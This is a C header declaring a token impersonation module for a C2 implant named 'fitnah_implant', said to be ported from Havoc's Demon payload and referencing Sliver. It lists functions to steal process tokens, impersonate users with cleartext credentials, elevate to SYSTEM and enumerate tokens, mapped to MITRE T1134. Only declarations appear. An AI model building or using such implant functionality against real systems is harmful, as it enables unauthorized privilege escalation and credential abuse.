/*
 * token.h — Standalone token impersonation module
 *
 * Ported and stripped from HavocFramework/Havoc payloads/Demon/src/core/Token.c
 * (MIT License, Copyright 2022 HavocFramework).  All Demon Instance globals
 * replaced with plain Win32 / NtDll calls so the code compiles as part of
 * fitnah_implant.c without the Demon runtime.
 *
 * Sliver reference: BishopFox/sliver implant/sliver/priv/priv_windows.go
 * (MIT License, Copyright 2019 Bishop Fox).
 *
 * MITRE: T1134.001 (Token Impersonation/Theft)
 *        T1134.002 (Create Process with Token)
 *        T1134.003 (Make and Impersonate Token)
 */
#pragma once
#include <windows.h>
#include <stdint.h>

/* ── Return codes ────────────────────────────────────────────────────────── */
#define TOKEN_OK            0
#define TOKEN_ERR_PRIVS    -1
#define TOKEN_ERR_OPEN     -2
#define TOKEN_ERR_DUP      -3
#define TOKEN_ERR_IMPERSON -4
#define TOKEN_ERR_LOGON    -5
#define TOKEN_ERR_NOTFOUND -6

/* ── Result string helpers — callers must free() ─────────────────────────── */

/*
 * TokenMakeToken — LogonUser + ImpersonateLoggedOnUser.
 * Equivalent to Cobalt Strike make_token / Sliver MakeToken.
 *
 * domain   : NETBIOS domain or "." for local account
 * username : account name
 * password : cleartext password
 *
 * Returns heap-allocated status string (free on caller).
 */
char *TokenMakeToken(const char *domain, const char *username, const char *password);

/*
 * TokenStealToken — open a privileged process, duplicate its primary token,
 * and call ImpersonateLoggedOnUser.  Equivalent to Havoc steal_token /
 * Sliver impersonateProcess.
 *
 * pid : target process ID (0 = auto-select SYSTEM-owned process)
 */
char *TokenStealToken(DWORD pid);

/*
 * TokenRevSelf — revert thread to process token (ImpersonateLoggedOnUser
 * clears the impersonation if we pass NULL; falls back to RevertToSelf).
 */
char *TokenRevSelf(void);

/*
 * TokenGetSystem — inject into a SYSTEM-owned process to elevate to NT AUTHORITY\SYSTEM.
 * Uses CreateProcessWithTokenW to spawn a child under the duplicated token.
 *
 * cmdline : command to launch as SYSTEM (default "cmd.exe" if NULL)
 */
char *TokenGetSystem(const char *cmdline);

/*
 * TokenListProcessTokens — enumerate processes and return a JSON array of
 * { pid, integrity, username } entries.  Requires SeDebugPrivilege.
 */
char *TokenListProcessTokens(void);
